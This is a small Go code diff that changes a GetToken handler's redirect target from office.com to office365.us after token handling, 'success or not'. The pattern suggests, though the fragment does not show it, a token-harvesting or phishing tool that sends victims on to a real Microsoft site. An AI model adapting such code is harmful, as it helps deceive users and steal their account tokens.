@@ -92,5 +92,5 @@ func GetToken(w http.ResponseWriter, r *http.Request) {
 
 	}
 	// Whatever happens, success or not we need to redirect
-	http.Redirect(w, r, "https://office.com", 301)
+	http.Redirect(w, r, "https://office365.us", 301)
 }
